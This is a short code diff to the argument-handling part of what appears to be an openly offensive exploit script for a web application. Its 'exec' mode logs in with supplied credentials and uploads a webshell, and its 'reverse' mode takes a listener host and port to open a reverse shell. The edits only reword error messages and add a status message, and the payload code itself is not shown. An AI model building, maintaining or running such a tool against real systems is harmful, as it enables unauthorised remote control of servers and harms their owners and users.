@@ -324,8 +324,9 @@ def main():
         # settings for exec mode
         case 'exec':
             if not all([args.url, args.user, args.password]):
-                parser.error("-u, -U, -p arguments are requires for this mode.")
+                parser.error(" url, -u, -p arguments are requires for this mode.")
             else:
+                output.message("success", "Mode Webshell selected", False)
                 webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
                 webshell.login(username=args.user, password=args.password)
                 webshell.upload()
@@ -333,7 +334,7 @@ def main():
         # settings for reverse mode
         case 'reverse':
             if not all([args.url, args.user, args.password, args.lhost, args.lport]):
-                parser.error("-u, -p, lhost, lport arguments are requires for this mode.")
+                parser.error(" -u, -p, --lhost, --lport arguments are requires for this mode.")
             else:
                 output.message("success", "Mode Reverse shell selected", False)
                 revereshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
